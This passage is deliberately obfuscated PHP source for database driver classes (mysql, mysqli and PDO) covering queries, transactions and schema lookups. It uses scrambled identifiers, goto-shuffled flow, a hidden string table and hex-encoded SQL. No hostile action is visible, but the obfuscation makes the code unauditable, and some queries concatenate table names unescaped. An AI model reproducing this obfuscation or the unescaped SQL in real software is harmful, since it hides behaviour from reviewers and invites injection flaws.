C‚ê¤ÈŒÓĞ: think_action_status($b’äëà†½[19], 1); think_status($b’äëà†½[20]); $this->queryID = mysql_query($b‚ãÃö¢ª, $this->_linkID); goto DÂï­ÖâÛ; BÙ”Úó†ÅÈ: $b’äëà†½ =& $_SERVER[ä°„ä°º]; if (0 === stripos($b‚ãÃö¢ª, $b’äëà†½[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto BÀ½Ãò¤„; BÀ½Ãò¤„: if (!$this->_linkID) { return !1; } $this->queryStr = $b‚ãÃö¢ª; if ($this->queryID) { $this->free(); } goto C‚ê¤ÈŒÓĞ; DÂï­ÖâÛ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto d‹—–’ÑÆß; d‹—–’ÑÆß: } public function execute($d¬ˆ‹ùŸËÍ) { goto F·äùòáöì; c×¾ï¡‹Şš: if (!1 === $AÁíÛ³Á˜) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto BÏóø¬Ò’«; Eˆæç¾ªëâ: $this->queryStr = $d¬ˆ‹ùŸËÍ; if ($this->queryID) { $this->free(); } think_action_status($a´£Ï½ŒÅÒ[21], 1); goto DÀ‘»ÁÒöÌ; DÀ‘»ÁÒöÌ: think_status($a´£Ï½ŒÅÒ[20]); $AÁíÛ³Á˜ = mysql_query($d¬ˆ‹ùŸËÍ, $this->_linkID); $this->debug(); goto c×¾ï¡‹Şš; F·äùòáöì: $a´£Ï½ŒÅÒ =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eˆæç¾ªëâ; BÏóø¬Ò’«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ä°„ä°º][876], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A¬Ì„ßŞ«  = mysql_query($_SERVER[ä°„ä°º][877], $this->_linkID); $this->transTimes = 0; if (!$A¬Ì„ßŞ« ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E˜óªö³ñ® = mysql_query($_SERVER[ä°„ä°º][878], $this->_linkID); $this->transTimes = 0; if (!$E˜óªö³ñ®) { $this->error(); return !1; } } return !0; } private function getAll() { $aÆï’‹–Œ = array(); if ($this->numRows > 0) { while ($C˜ÀÌ®ùñ÷ = mysql_fetch_assoc($this->queryID)) { $aÆï’‹–Œ[] = $C˜ÀÌ®ùñ÷; } mysql_data_seek($this->queryID, 0); } return $aÆï’‹–Œ; } public function getFields($D­‡¾ÅÇ²Ÿ) { $e¯Ü’åîõ =& $_SERVER[ä°„ä°º]; $d¿´‰í»À = $this->query($e¯Ü’åîõ[879] . $this->parseKey($D­‡¾ÅÇ²Ÿ)); $E¼¾ßÏò†Ş = array(); if ($d¿´‰í»À) { foreach ($d¿´‰í»À as $A»Ó¼›ôİÆ => $C¹—ßÅÌ†) { $E¼¾ßÏò†Ş[$C¹—ßÅÌ†[$e¯Ü’åîõ[27]]] = array($e¯Ü’åîõ[28] => $C¹—ßÅÌ†[$e¯Ü’åîõ[27]], $e¯Ü’åîõ[29] => $C¹—ßÅÌ†[$e¯Ü’åîõ[30]], $e¯Ü’åîõ[31] => (bool) (strtoupper($C¹—ßÅÌ†[$e¯Ü’åîõ[32]]) === $e¯Ü’åîõ[880]), $e¯Ü’åîõ[34] => $C¹—ßÅÌ†[$e¯Ü’åîõ[35]], $e¯Ü’åîõ[36] => strtolower($C¹—ßÅÌ†[$e¯Ü’åîõ[37]]) == $e¯Ü’åîõ[38], $e¯Ü’åîõ[39] => strtolower($C¹—ßÅÌ†[$e¯Ü’åîõ[40]]) == $e¯Ü’åîõ[41]); } } return $E¼¾ßÏò†Ş; } public function getTables($d™¸ÊÀÂÖÖ = '') { $b´õ†š¤¨¦ =& $_SERVER[ä°„ä°º]; if (!empty($d™¸ÊÀÂÖÖ)) { $aïÆ¨•ã¼ = $b´õ†š¤¨¦[881] . $d™¸ÊÀÂÖÖ . $b´õ†š¤¨¦[882]; } else { $aïÆ¨•ã¼ = $b´õ†š¤¨¦[883]; } $F¦À´â÷ Ÿ = $this->query($aïÆ¨•ã¼); $Fó˜Ö¶Ü¬£ = array(); foreach ($F¦À´â÷ Ÿ as $DîÈÒ¢Âôã => $e¨ã‰¼Í¡è) { $Fó˜Ö¶Ü¬£[$DîÈÒ¢Âôã] = current($e¨ã‰¼Í¡è); } return $Fó˜Ö¶Ü¬£; } public function replace($fº—ñ§¡, $D®ºÒøö÷ = array()) { $DÍš‡ÒëŒ‹ =& $_SERVER[ä°„ä°º]; foreach ($fº—ñ§¡ as $Bïİš®Ì±¢ => $EÎíÇğÄœ) { $C¥©Šö§ô‡ = $this->parseValue($EÎíÇğÄœ); if (is_scalar($C¥©Šö§ô‡)) { $fƒËëˆ­Â¸[] = $C¥©Šö§ô‡; $C¹‹¿î¡åØ[] = $this->parseKey($Bïİš®Ì±¢); } } $e„Ø‚¨İŒ = $DÍš‡ÒëŒ‹[884] . $this->parseTable($D®ºÒøö÷[$DÍš‡ÒëŒ‹[277]]) . $DÍš‡ÒëŒ‹[885] . implode($DÍš‡ÒëŒ‹[47], $C¹‹¿î¡åØ) . $DÍš‡ÒëŒ‹[886] . implode($DÍš‡ÒëŒ‹[47], $fƒËëˆ­Â¸) . $DÍš‡ÒëŒ‹[887]; return $this->execute($e„Ø‚¨İŒ); } public function insertAll($B½Ú´ßåç¤, $b¡Á…‰î»  = array(), $Dö°§‰àÇ¡ = false) { goto DÑÓ­ËõÆ; b³“ÁÚŠ¢‚: $b‚÷¶ğƒ¢ = array(); foreach ($B½Ú´ßåç¤ as $a»¢ô÷•óµ) { $cù˜ò•ŞÆÕ = array(); foreach ($a»¢ô÷•óµ as $f£Ò¹Ú’‡ => $eà°…º±ê„) { $eà°…º±ê„ = $this->parseValue($eà°…º±ê„); if (is_scalar($eà°…º±ê„)) { $cù˜ò•ŞÆÕ[] = $eà°…º±ê„; } } $b‚÷¶ğƒ¢[] = $cèÚ¶‰êë[258] . implode($cèÚ¶‰êë[47], $cù˜ò•ŞÆÕ) . $cèÚ¶‰êë[887]; } array_walk($B©‚ Î¸ÂŸ, array($this, $cèÚ¶‰êë[888])); goto DÑ‰«¾×¢Ô; DÑÓ­ËõÆ: $cèÚ¶‰êë =& $_SERVER[ä°„ä°º]; if (!is_array($B½Ú´ßåç¤[0])) { return !1; } $B©‚ Î¸ÂŸ = array_keys($B½Ú´ßåç¤[0]); goto b³“ÁÚŠ¢‚; DÑ‰«¾×¢Ô: $F÷éŒ’’Œš = ($Dö°§‰àÇ¡ ? $cèÚ¶‰êë[889] : $cèÚ¶‰êë[890]) . $cèÚ¶‰êë[891] . $this->parseTable($b¡Á…‰î» [$cèÚ¶‰êë[277]]) . $cèÚ¶‰êë[885] . implode($cèÚ¶‰êë[47], $B©‚ Î¸ÂŸ) . $cèÚ¶‰êë[892] . implode($cèÚ¶‰êë[47], $b‚÷¶ğƒ¢); return $this->execute($F÷éŒ’’Œš); goto CËõÉë”ìê; CËõÉë”ìê: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fà¥‹°Œ¡¹ =& $_SERVER[ä°„ä°º]; $this->error = mysql_errno() . $fà¥‹°Œ¡¹[4] . mysql_error($this->_linkID); if ($fà¥‹°Œ¡¹[33] != $this->queryStr) { $this->error .= LNG($fà¥‹°Œ¡¹[45]) . $this->queryStr; } think_trace($this->error, $fà¥‹°Œ¡¹[33], $fà¥‹°Œ¡¹[46]); return $this->error; } public function escapeString($Cè‡Å•–ô‚) { if ($this->_linkID) { return mysql_real_escape_string($Cè‡Å•–ô‚, $this->_linkID); } else { return mysql_escape_string($Cè‡Å•–ô‚); } } public function parseKey(&$E‚§Õª›ã‚, $Bá£Õ¿«¿ = true) { $dëÖ±ä¨Ó =& $_SERVER[ä°„ä°º]; if ($Bá£Õ¿«¿) { $E‚§Õª›ã‚ = $this->parseKeyCheck($E‚§Õª›ã‚); } if ($E‚§Õª›ã‚ != $dëÖ±ä¨Ó[182] && !preg_match($dëÖ±ä¨Ó[893], $E‚§Õª›ã‚)) { $E‚§Õª›ã‚ = $dëÖ±ä¨Ó[382] . trim($E‚§Õª›ã‚, $dëÖ±ä¨Ó[382]) . $dëÖ±ä¨Ó[382]; } return $E‚§Õª›ã‚; } } class DbMysqli extends Db { public function __construct($fàÈˆí¹ = '') { $AÓ¹¬Ó±‰á =& $_SERVER[ä°„ä°º]; if (!extension_loaded($AÓ¹¬Ó±‰á[781])) { think_exception(think_lang($AÓ¹¬Ó±‰á[10]) . $AÓ¹¬Ó±‰á[894]); } if (!empty($fàÈˆí¹)) { $this->config = $fàÈˆí¹; if (empty($this->config[$AÓ¹¬Ó±‰á[13]])) { $this->config[$AÓ¹¬Ó±‰á[13]] = $AÓ¹¬Ó±‰á[33]; } } } public function connect($bêÌññ©µ = '', $C¥£ëæò¿ = 0) { $Eåï›Ø£ =& $_SERVER[ä°„ä°º]; if (!isset($this->linkID[$C¥£ëæò¿])) { goto fö¸Ú¸öµÚ; BôÊÏ¿ìÚß: $a²²ªÌ³êî = $this->linkID[$C¥£ëæò¿]->server_version; $this->linkID[$C¥£ëæò¿]->query($Eåï›Ø£[872] . think_config($Eåï›Ø£[873]) . $Eåï›Ø£[55]); if ($a²²ªÌ³êî > $Eåï›Ø£[874]) { $this->linkID[$C¥£ëæò¿]->query($Eåï›Ø£[875]); } goto a†§‰–‹™„; fö¸Ú¸öµÚ: if (empty($bêÌññ©µ)) { $bêÌññ©µ = $this->config; } $this->linkID[$C¥£ëæò¿] = new mysqli($bêÌññ©µ[$Eåï›Ø£[868]], $bêÌññ©µ[$Eåï›Ø£[870]], $bêÌññ©µ[$Eåï›Ø£[871]], $bêÌññ©µ[$Eåï›Ø£[17]], $bêÌññ©µ[$Eåï›Ø£[869]] ? intval($bêÌññ©µ[$Eåï›Ø£[869]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto BôÊÏ¿ìÚß; a†§‰–‹™„: $this->connected = !0; if (1 != think_config($Eåï›Ø£[18])) { unset($this->config); } goto dÏÓÉĞÄ³´; dÏÓÉĞÄ³´: } return $this->linkID[$C¥£ëæò¿]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Aãî½—ğÖ“) { goto d¥ƒƒÈ¿å; eƒîë¿§Ş: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto A…£ô’äò; dóäÇ“¿Ú: $this->queryStr = $Aãî½—ğÖ“; if ($this->queryID) { $this->free(); } think_action_status($Dòáí¤˜ì[19], 1); goto e´™ÎæîÕÔ; e´™ÎæîÕÔ: think_status($Dòáí¤˜ì[20]); $this->queryID = $this->_linkID->query($Aãî½—ğÖ“); if ($this->_linkID->more_results()) { while (($dÊŞ·åˆŸƒ = $this->_linkID->next_result()) != NULL) { $dÊŞ·åˆŸƒ->free_result(); } } goto eƒîë¿§Ş; d¥ƒƒÈ¿å: $Dòáí¤˜ì =& $_SERVER[ä°„ä°º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dóäÇ“¿Ú; A…£ô’äò: } public function execute($F¾Ü¹Ö•»Ó) { goto f˜ˆáë†­¡; f˜ˆáë†­¡: $e¡×¥ŸÌ„Æ =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f¡°ƒ—œè¹; D…§ ä ùñ: think_status($e¡×¥ŸÌ„Æ[20]); $B·±Şˆ†Àµ = $this->_linkID->query($F¾Ü¹Ö•»Ó); $this->debug(); goto eÕ“±½‚ë; f¡°ƒ—œè¹: $this->queryStr = $F¾Ü¹Ö•»Ó; if ($this->queryID) { $this->free(); } think_action_status($e¡×¥ŸÌ„Æ[21], 1); goto D…§ ä ùñ; eÕ“±½‚ë: if (!1 === $B·±Şˆ†Àµ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto AƒîÙè³Ôí; AƒîÙè³Ôí: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D‡¯öÁÑ—“ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D‡¯öÁÑ—“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¬’”¾ß„Ğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¬’”¾ß„Ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $aÅïÉƒ½êÓ = array(); if ($this->numRows > 0) { for ($A¿ŞÓÀöß = 0; $A¿ŞÓÀöß < $this->numRows; $A¿ŞÓÀöß++) { $aÅïÉƒ½êÓ[$A¿ŞÓÀöß] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aÅïÉƒ½êÓ; } public function getFields($eí°ƒÙÌ“Ğ) { $A±ê×‹¦±œ =& $_SERVER[ä°„ä°º]; $F¦¥«¥ÎÀ« = $this->query($A±ê×‹¦±œ[879] . $this->parseKey($eí°ƒÙÌ“Ğ)); $Eø¼ÄÄß‘ = array(); if ($F¦¥«¥ÎÀ«) { foreach ($F¦¥«¥ÎÀ« as $cãŒÌÃàÔŸ => $aƒ·Èà®Ã) { $Eø¼ÄÄß‘[$aƒ·Èà®Ã[$A±ê×‹¦±œ[27]]] = array($A±ê×‹¦±œ[28] => $aƒ·Èà®Ã[$A±ê×‹¦±œ[27]], $A±ê×‹¦±œ[29] => $aƒ·Èà®Ã[$A±ê×‹¦±œ[30]], $A±ê×‹¦±œ[31] => (bool) ($aƒ·Èà®Ã[$A±ê×‹¦±œ[32]] === $A±ê×‹¦±œ[33]), $A±ê×‹¦±œ[34] => $aƒ·Èà®Ã[$A±ê×‹¦±œ[35]], $A±ê×‹¦±œ[36] => strtolower($aƒ·Èà®Ã[$A±ê×‹¦±œ[37]]) == $A±ê×‹¦±œ[38], $A±ê×‹¦±œ[39] => strtolower($aƒ·Èà®Ã[$A±ê×‹¦±œ[40]]) == $A±ê×‹¦±œ[41]); } } return $Eø¼ÄÄß‘; } public function getTables($FŒæ’Ùíâ = '') { $C¤Ê‹Íğ =& $_SERVER[ä°„ä°º]; $EÙ‚èŠª— = !empty($FŒæ’Ùíâ) ? $C¤Ê‹Íğ[881] . $FŒæ’Ùíâ . $C¤Ê‹Íğ[882] : $C¤Ê‹Íğ[883]; $aİÖäíêŞ = $this->query($EÙ‚èŠª—); $fŠ×ˆŸ æ = array(); if ($aİÖäíêŞ) { foreach ($aİÖäíêŞ as $B£¼œ¢½˜í => $f›ó²Ü´Ö) { $fŠ×ˆŸ æ[$B£¼œ¢½˜í] = current($f›ó²Ü´Ö); } } return $fŠ×ˆŸ æ; } public function replace($bí¼ãº¹Êª, $EÊ°¾³Í = array()) { $CÔ·¢ÛÃˆ =& $_SERVER[ä°„ä°º]; foreach ($bí¼ãº¹Êª as $aÎÉÊ…Ø¦ => $AÆ»ßÆÄ¾) { $bİ­˜ÅÎÏ± = $this->parseValue($AÆ»ßÆÄ¾); if (is_scalar($bİ­˜ÅÎÏ±)) { $aÜÖİì÷á°[] = $bİ­˜ÅÎÏ±; $bÆÁ–èô¤š[] = $this->parseKey($aÎÉÊ…Ø¦); } } $aŒéİ’ßÅï = $CÔ·¢ÛÃˆ[884] . $this->parseTable($EÊ°¾³Í[$CÔ·¢ÛÃˆ[277]]) . $CÔ·¢ÛÃˆ[885] . implode($CÔ·¢ÛÃˆ[47], $bÆÁ–èô¤š) . $CÔ·¢ÛÃˆ[886] . implode($CÔ·¢ÛÃˆ[47], $aÜÖİì÷á°) . $CÔ·¢ÛÃˆ[887]; return $this->execute($aŒéİ’ßÅï); } public function insertAll($F¹îó®„ÚØ, $f”Ãòçƒ± = array(), $Dƒ¯ó•®àï = false) { goto D˜×Áã¹Ë«; D˜×Áã¹Ë«: $C§³›š¼•… =& $_SERVER[ä°„ä°º]; if (!is_array($F¹îó®„ÚØ[0])) { return !1; } $f…†°°¦ââ = array_keys($F¹îó®„ÚØ[0]); goto f»ƒÛø¯İ; Bê½Ÿ“‚õô: $EŞŞŞ‰ù—¢ = $Dƒ¯ó•®àï ? $C§³›š¼•…[889] : $C§³›š¼•…[890]; $b³ŸˆÂ†µâ = $EŞŞŞ‰ù—¢ . $C§³›š¼•…[891] . $this->parseTable($f”Ãòçƒ±[$C§³›š¼•…[277]]) . $C§³›š¼•…[885] . implode($C§³›š¼•…[47], $f…†°°¦ââ) . $C§³›š¼•…[892] . implode($C§³›š¼•…[47], $F„«½„§Ù); return $this->execute($b³ŸˆÂ†µâ); goto Aò†í³æÈ”; f»ƒÛø¯İ: $F„«½„§Ù = array(); foreach ($F¹îó®„ÚØ as $D‚  ›•å) { $EÚô¬Á§Ù‹ = array(); foreach ($D‚  ›•å as $C¥™Ñ³Î => $D°¿ÚÈòô) { $D°¿ÚÈòô = $this->parseValue($D°¿ÚÈòô); if (is_scalar($D°¿ÚÈòô)) { $EÚô¬Á§Ù‹[] = $D°¿ÚÈòô; } } $F„«½„§Ù[] = $C§³›š¼•…[258] . implode($C§³›š¼•…[47], $EÚô¬Á§Ù‹) . $C§³›š¼•…[887]; } array_walk($f…†°°¦ââ, array($this, $C§³›š¼•…[888])); goto Bê½Ÿ“‚õô; Aò†í³æÈ”: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fé÷èË§õ =& $_SERVER[ä°„ä°º]; $this->error = $this->_linkID->errno . $fé÷èË§õ[4] . $this->_linkID->error; if ($fé÷èË§õ[33] != $this->queryStr) { $this->error .= LNG($fé÷èË§õ[45]) . $this->queryStr; } think_trace($this->error, $fé÷èË§õ[33], $fé÷èË§õ[46]); return $this->error; } public function escapeString($Cùğ›‰®¼) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Cùğ›‰®¼); } else { return addslashes($Cùğ›‰®¼); } } public function parseKey(&$E¥Š—£Äİ¥, $b±ªºÔùé = true) { $e¿¥ÁÇè Ò =& $_SERVER[ä°„ä°º]; if ($b±ªºÔùé) { $E¥Š—£Äİ¥ = $this->parseKeyCheck($E¥Š—£Äİ¥); } if ($E¥Š—£Äİ¥ != $e¿¥ÁÇè Ò[182] && !preg_match($e¿¥ÁÇè Ò[893], $E¥Š—£Äİ¥)) { $E¥Š—£Äİ¥ = $e¿¥ÁÇè Ò[382] . trim($E¥Š—£Äİ¥, $e¿¥ÁÇè Ò[382]) . $e¿¥ÁÇè Ò[382]; } return $E¥Š—£Äİ¥; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d†…¤ğŞƒŞ = '') { $eòÃ½Ğíˆ¯ =& $_SERVER[ä°„ä°º]; if (!class_exists($eòÃ½Ğíˆ¯[895])) { think_exception(think_lang($eòÃ½Ğíˆ¯[10]) . $eòÃ½Ğíˆ¯[896]); } if (!empty($d†…¤ğŞƒŞ)) { $this->config = $d†…¤ğŞƒŞ; if (empty($this->config[$eòÃ½Ğíˆ¯[13]])) { $this->config[$eòÃ½Ğíˆ¯[13]] = array(); } } } public function connect($eò¦÷ˆäË¾ = '', $A’È²µß´• = 0) { $a±Å’§Ã‚™ =& $_SERVER[ä°„ä°º]; if (!isset($this->linkID[$A’È²µß´•])) { goto f‚ªÄÇôéì; Aäáƒ”‹Ç: if (!$this->linkID[$A’È²µß´•]) { think_exception($a±Å’§Ã‚™[905]); } try { $this->linkID[$A’È²µß´•]->exec($a±Å’§Ã‚™[906] . think_config($a±Å’§Ã‚™[873])); } catch (Exception $e”÷Ê‰‹ªâ) { } $this->connected = !0; goto eİ‚Û™²×Œ; f‚ªÄÇôéì: if (empty($eò¦÷ˆäË¾)) { $eò¦÷ˆäË¾ = $this->config; } $Aˆ»Îİºé = !empty($eò¦÷ˆäË¾[$a±Å’§Ã‚™[13]][$a±Å’§Ã‚™[14]]) ? $eò¦÷ˆäË¾[$a±Å’§Ã‚™[13]][$a±Å’§Ã‚™[14]] : $this->pconnect; if ($Aˆ»Îİºé) { $eò¦÷ˆäË¾[$a±Å’§Ã‚™[13]][PDO::ATTR_PERSISTENT] = !0; } goto dÇ®´ó‘„æ; dÇ®´ó‘„æ: try { $this->linkID[$A’È²µß´•] = new PDO($eò¦÷ˆäË¾[$a±Å’§Ã‚™[897]], $eò¦÷ˆäË¾[$a±Å’§Ã‚™[870]], $eò¦÷ˆäË¾[$a±Å’§Ã‚™[871]], $eò¦÷ˆäË¾[$a±Å’§Ã‚™[13]]); } catch (PDOException $e”÷Ê‰‹ªâ) { think_exception($e”÷Ê‰‹ªâ->getMessage()); } $this->dbType = $this->_getDsnType($eò¦÷ˆäË¾[$a±Å’§Ã‚™[897]]); if (in_array($this->dbType, array($a±Å’§Ã‚™[898], $a±Å’§Ã‚™[899], $a±Å’§Ã‚™[900], $a±Å’§Ã‚™[901]))) { think_exception($a±Å’§Ã‚™[902] . $this->dbType . $a±Å’§Ã‚™[903] . $this->dbType . $a±Å’§Ã‚™[904]); } goto Aäáƒ”‹Ç; eİ‚Û™²×Œ: if (1 != think_config($a±Å’§Ã‚™[18])) { unset($this->config); } goto d”öÙšÛ“×; d”öÙšÛ“×: } return $this->linkID[$A’È²µß´•]; } public function free() { $this->PDOStatement = null; } public function query($AŸ±•ë÷Ç, $DŠ³Ïæó÷ = array()) { goto AºŠ«Äƒõ£; BæÉê”¡¥: think_action_status($dˆ›ä”Ìè[19], 1); think_status($dˆ›ä”Ìè[20]); $this->PDOStatement = $this->_linkID->prepare($AŸ±•ë÷Ç); goto Bïä¯”‘â‘; e²©½­¹Œñ: if (!1 === $B£ßœÔçĞà) { $this->error(); return !1; } else { return $this->getAll(); } goto F“ˆÒêˆµ; Bïä¯”‘â‘: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $B£ßœÔçĞà = $this->PDOStatement->execute($DŠ³Ïæó÷); $this->debug(); goto e²©½­¹Œñ; d¿Ñæ†¼÷Â: $this->queryStr = $AŸ±•ë÷Ç; if (!empty($DŠ³Ïæó÷)) { $this->queryStr .= $dˆ›ä”Ìè[907] . print_r($DŠ³Ïæó÷, !0) . $dˆ›ä”Ìè[908]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BæÉê”¡¥; AºŠ«Äƒõ£: $dˆ›ä”Ìè =& $_SERVER[ä°„ä°º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d¿Ñæ†¼÷Â; F“ˆÒêˆµ: } public function execute($a«×èÅ«µ†, $C·ÅÁçµ· = array()) { goto BÜ‚½Û—­ä; FĞ‡ø—è©Ù: $this->queryStr = $a«×èÅ«µ†; if (!empty($C·ÅÁçµ·)) { $this->queryStr .= $E¼”‘¢¶æ[907] . print_r($C·ÅÁçµ·, !0) . $E¼”‘¢¶æ[908]; } $b¥âŒÂ«Ö¢ = !1; goto FÄôÊ—È„; E¤Â¤†í : $eŒÀ¡‚ßŸ = $this->PDOStatement->execute($C·ÅÁçµ·); $this->debug(); if (!1 === $eŒÀ¡‚ßŸ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($b¥âŒÂ«Ö¢ || preg_match($E¼”‘¢¶æ[913], $a«×èÅ«µ†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto B½Í®ÊøÏ; c±¸ãÃâĞ”: think_status($E¼”‘¢¶æ[20]); $this->PDOStatement = $this->_linkID->prepare($a«×èÅ«µ†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto E¤Â¤†í ; FÄôÊ—È„: if ($this->dbType == $E¼”‘¢¶æ[901]) { if (preg_match($E¼”‘¢¶æ[909], $this->queryStr, $eÌæ“ƒ¿Á‡)) { $this->table = think_config($E¼”‘¢¶æ[910]) . str_ireplace(think_config($E¼”‘¢¶æ[911]), $E¼”‘¢¶æ[375], $eÌæ“ƒ¿Á‡[2]); $b¥âŒÂ«Ö¢ = (bool) $this->query($E¼”‘¢¶æ[912] . strtoupper($this->table) . $E¼”‘¢¶æ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($E¼”‘¢¶æ[21], 1); goto c±¸ãÃâĞ”; BÜ‚½Û—­ä: $E¼”‘¢¶æ =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FĞ‡ø—è©Ù; B½Í®ÊøÏ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $díôøä‘Ã = $this->_linkID->commit(); $this->transTimes = 0; if (!$díôøä‘Ã) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eĞ…ªï›…’ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eĞ…ªï›…’) { $this->error(); return !1; } } return !0; } private function getAll() { $F¦ŒÚ„ˆÉ† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($F¦ŒÚ„ˆÉ†); return $F¦ŒÚ„ˆÉ†; } public function getFields($aİœÒÉÖ„ï) { goto CÇ‡ó˜Ê‚; bŸ›¢àÈ©: return $b†Í‚°Äïô; goto f´ìƒš²â; CÇ‡ó˜Ê‚: $eÏ–¦Â¨Çæ =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (think_config($eÏ–¦Â¨Çæ[914])) { $Dêè–“šÍã = str_replace($eÏ–¦Â¨Çæ[915], $aİœÒÉÖ„ï, think_config($eÏ–¦Â¨Çæ[914])); } else { switch ($this->dbType) { case $eÏ–¦Â¨Çæ[898]: case $eÏ–¦Â¨Çæ[916]: $Dêè–“šÍã = "\x53\105\114\x45\x43\124\x20\40\40\x63\157\x6c\x75\x6d\x6e\x5f\156\141\x6d\145\40\x61\163\x20\47\116\x61\155\145\47\54\x20\x20\x20\x64\x61\x74\x61\x5f\164\x79\x70\145\x20\x61\x73\40\x27\124\171\160\145\x27\54\40\40\40\143\157\154\x75\x6d\156\137\x64\145\x66\x61\x75\154\164\40\x61\x73\40\47\x44\x65\x66\141\x75\x6c\x74\47\x2c\40\x20\x20\x69\163\137\156\165\x6c\154\x61\142\154\x65\x20\141\x73\x20\47\116\165\x6c\154\x27\12\11\x9\x46\122\117\x4d\11\151\x6e\146\157\162\155\141\164\151\x6f\156\x5f\x73\143\150\145\x6d\141\x2e\164\141\142\x6c\145\163\x20\x41\x53\40\164\12\x9\x9\112\x4f\111\116\x9\x69\156\146\x6f\x72\x6d\x61\164\x69\157\x6e\137\163\x63\150\x65\155\x61\x2e\143\157\154\x75\155\156\163\x20\x41\x53\x20\143\xa\x9\x9\x4f\116\40\40\x74\56\164\x61\142\154\x65\x5f\143\x61\x74\x61\154\x6f\147\x20\x3d\40\x63\x2e\164\141\x62\x6c\x65\137\x63\141\164\141\x6c\x6f\147\12\11\11\x41\116\x44\x20\164\56\x74\141\142\154\x65\137\x73\143\x68\145\x6d\x61\x20\x3d\x20\143\x2e\164\x61\x62\x6c\145\137\x73\x63\150\145\155\141\xa\11\11\101\116\x44\x20\164\x2e\164\141\142\x6c\145\x5f\x6e\x61\x6d\145\40\x3d\40\143\56\164\141\x62\154\145\137\156\x61\155\145\xa\x9\11\127\x48\105\x52\x45\40\x20\40\x74\x2e\x74\141\142\154\145\137\x6e\141\155\145\x20\75\x20\47{$aİœÒÉÖ„ï}\x27"; break; case $eÏ–¦Â¨Çæ[917]: $Dêè–“šÍã = $eÏ–¦Â¨Çæ[918] . $aİœÒÉÖ„ï . $eÏ–¦Â¨Çæ[919]; break; case $eÏ–¦Â¨Çæ[899]: case $eÏ–¦Â¨Çæ[901]: $Dêè–“šÍã = $eÏ–¦Â¨Çæ[920] . $eÏ–¦Â¨Çæ[921] . $eÏ–¦Â¨Çæ[922] . strtoupper($aİœÒÉÖ„ï) . $eÏ–¦Â¨Çæ[923] . strtoupper($aİœÒÉÖ„ï) . $eÏ–¦Â¨Çæ[924]; break; case $eÏ–¦Â¨Çæ[925]: $Dêè–“šÍã = $eÏ–¦Â¨Çæ[926] . $aİœÒÉÖ„ï . $eÏ–¦Â¨Çæ[927]; break; case $eÏ–¦Â¨Çæ[900]: break; case $eÏ–¦Â¨Çæ[928]: default: $Dêè–“šÍã = $eÏ–¦Â¨Çæ[929] . ($this->dbType == $eÏ–¦Â¨Çæ[928] ? "\140{$aİœÒÉÖ„ï}\140" : $aİœÒÉÖ„ï); } } goto Cˆ¦°é¥¿É; Cˆ¦°é¥¿É: $dÔÕ‡¾¿è = $this->query($Dêè–“šÍã); $b†Í‚°Äïô = array(); if ($dÔÕ‡¾¿è) { foreach ($dÔÕ‡¾¿è as $Aá¼ËÜòÊ¶ => $EäíáÊÏÄæ) { $EäíáÊÏÄæ = array_change_key_case($EäíáÊÏÄæ); $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[28]] = isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[28]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[28]] : $eÏ–¦Â¨Çæ[375]; $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[29]] = isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[29]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[29]] : $eÏ–¦Â¨Çæ[375]; $c¼ê×¯¹Æ = 